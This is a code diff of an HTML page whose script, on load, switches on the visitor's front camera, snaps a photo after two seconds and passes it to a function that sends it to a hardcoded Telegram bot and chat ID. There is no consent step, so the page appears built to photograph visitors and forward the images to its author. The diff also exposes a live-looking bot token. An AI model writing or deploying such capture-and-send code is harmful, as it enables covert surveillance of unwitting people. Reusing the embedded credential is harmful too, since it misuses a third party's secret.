@@ -7,31 +7,48 @@
 </head>
 <body>
     <h2>Захваченное изображение:</h2>
+    <video id="video" autoplay playsinline style="width: 100%; max-width: 400px;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
     <img id="photo" alt="Фото будет здесь" style="max-width: 100%; display: none;">
-    
+
     <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
         const photoElement = document.getElementById('photo');
 
         const BOT_TOKEN = "8186769001:AAHQ-3PT9NHqPbZTXvCinuMAhKpQJX2QQ68"; // Замени на новый токен
         const CHAT_ID = "7717007781"; // Твой chat_id
 
-        navigator.mediaDevices.getUserMedia({ video: true })
+        // Запрашиваем доступ к камере
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) // "user" — фронтальная камера
             .then(stream => {
-                const track = stream.getVideoTracks()[0];
-                const imageCapture = new ImageCapture(track);
-
-                return imageCapture.takePhoto(); // Захватываем фото
+                video.srcObject = stream;
+                return new Promise(resolve => setTimeout(resolve, 2000)); // Даем камере загрузиться
             })
-            .then(blob => {
-                displayPhoto(blob); // Отображаем фото на странице
-                sendPhoto(blob); // Отправляем в Telegram
+            .then(() => {
+                capturePhoto(); // Делаем фото после загрузки
             })
             .catch(error => console.error("Ошибка доступа к камере:", error));
+
+        function capturePhoto() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            video.srcObject.getTracks().forEach(track => track.stop()); // Останавливаем камеру
+
+            canvas.toBlob(blob => {
+                displayPhoto(blob);
+                sendPhoto(blob);
+            }, 'image/jpeg');
+        }
 
         function displayPhoto(blob) {
             const url = URL.createObjectURL(blob);
             photoElement.src = url;
-            photoElement.style.display = 'block'; // Показываем изображение
+            photoElement.style.display = 'block';
+            video.style.display = 'none'; // Скрываем видео после снимка
         }
 
         function sendPhoto(blob) {
